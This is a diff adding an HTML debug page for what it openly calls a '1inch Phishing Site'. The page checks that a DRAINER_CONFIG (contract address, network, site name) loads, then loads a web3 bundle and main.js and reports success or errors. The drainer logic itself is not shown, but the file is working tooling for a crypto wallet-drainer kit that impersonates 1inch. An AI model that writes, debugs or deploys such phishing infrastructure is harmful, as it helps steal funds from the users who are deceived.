@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>1inch Debug Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .status { padding: 10px; margin: 5px 0; border-radius: 5px; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .warning { background: #fff3cd; color: #856404; }
+    </style>
+</head>
+<body>
+    <h1>1inch Phishing Site Debug</h1>
+    <div id="status"></div>
+    
+    <script src="./js/drainer-config.js"></script>
+    <script>
+        const statusDiv = document.getElementById('status');
+        
+        function addStatus(message, type = 'success') {
+            const div = document.createElement('div');
+            div.className = `status ${type}`;
+            div.textContent = message;
+            statusDiv.appendChild(div);
+        }
+        
+        // Test configuration loading
+        try {
+            if (typeof DRAINER_CONFIG !== 'undefined') {
+                addStatus('✅ DRAINER_CONFIG loaded successfully', 'success');
+                addStatus(`📄 Contract: ${DRAINER_CONFIG.CONTRACT_ADDRESS}`, 'success');
+                addStatus(`🌐 Network: ${DRAINER_CONFIG.NETWORK_NAME}`, 'success');
+                addStatus(`🎯 Site: ${DRAINER_CONFIG.SITE_NAME}`, 'success');
+            } else {
+                addStatus('❌ DRAINER_CONFIG not found', 'error');
+            }
+        } catch (e) {
+            addStatus(`❌ Config error: ${e.message}`, 'error');
+        }
+        
+        // Test web3 bundle
+        const script = document.createElement('script');
+        script.src = './js/web3-bundle.js';
+        script.onload = () => addStatus('✅ Web3 bundle loaded', 'success');
+        script.onerror = () => addStatus('❌ Web3 bundle failed to load', 'error');
+        document.head.appendChild(script);
+        
+        // Test main.js
+        setTimeout(() => {
+            const mainScript = document.createElement('script');
+            mainScript.src = './js/main.js';
+            mainScript.onload = () => addStatus('✅ Main.js loaded', 'success');
+            mainScript.onerror = () => addStatus('❌ Main.js failed to load', 'error');
+            document.head.appendChild(mainScript);
+        }, 1000);
+        
+        // Check console errors
+        window.addEventListener('error', (e) => {
+            addStatus(`❌ JavaScript Error: ${e.message}`, 'error');
+        });
+        
+        addStatus('🔍 Debug script running...', 'warning');
+    </script>
+</body>
+</html>
